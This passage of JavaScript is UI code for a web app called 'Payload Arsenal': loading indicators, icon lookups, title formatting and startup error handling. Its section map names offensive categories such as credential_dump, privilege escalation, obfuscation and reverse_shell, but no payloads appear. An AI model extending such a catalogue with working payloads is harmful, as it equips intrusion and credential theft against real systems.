                }
            }, 300);
        }, 4000);
    }

    showLoadingIndicator(message = 'Loading...') {
        const indicator = document.getElementById('loadingIndicator');
        const text = document.getElementById('loadingText');
        if (indicator && text) {
            text.textContent = message;
            indicator.style.display = 'flex';
            indicator.classList.add('active');
        }
    }

    hideLoadingIndicator() {
        const indicator = document.getElementById('loadingIndicator');
        if (indicator) {
            indicator.classList.remove('active');
            setTimeout(() => {
                indicator.style.display = 'none';
            }, 300);
        }
    }

    getNotificationIcon(type) {
        const icons = {
            success: 'check-circle',
            error: 'exclamation-circle',
            warning: 'exclamation-triangle',
            info: 'info-circle'
        };
        return icons[type] || 'info-circle';
    }

    getPlatformIcon(platform) {
        const icons = {
            windows: 'fab fa-windows',
            linux: 'fab fa-linux',
            unix: 'fas fa-server',
            macos: 'fab fa-apple'
        };
        return icons[platform] || 'fas fa-desktop';
    }

    formatTitle(key) {
        return key.split('_').map(word => 
            word.charAt(0).toUpperCase() + word.slice(1)
        ).join(' ');
    }

    getSectionIcon(sectionId) {
        const icons = {
            system_info: 'fas fa-info-circle',
            network_recon: 'fas fa-network-wired',
            credential_dump: 'fas fa-key',
            windows_privesc: 'fas fa-crown',
            linux_privesc: 'fas fa-crown',
            obfuscation: 'fas fa-mask',
            reverse_shell: 'fas fa-terminal'
        };
        return icons[sectionId] || 'fas fa-cog';
    }
}

// Initialize the application
document.addEventListener('DOMContentLoaded', () => {
    try {
        console.log('DOM loaded, initializing Payload Arsenal...');
        window.app = new PayloadArsenal();
        
        setTimeout(() => {
            if (window.app && typeof window.app.updateStats === 'function') {
                window.app.updateStats();
            }
        }, 100);
        
    } catch (error) {
        console.error('Failed to initialize Payload Arsenal:', error);
        
        const errorDiv = document.createElement('div');
        errorDiv.innerHTML = `
            <div style="
                position: fixed;
                top: 20px;
                right: 20px;
                background: #ef4444;
                color: white;
                padding: 16px;
                border-radius: 8px;
                z-index: 9999;
                max-width: 400px;
            ">
                <strong>Error:</strong> Failed to load application. Please refresh the page.
            </div>
        `;
        document.body.appendChild(errorDiv);
    }
});
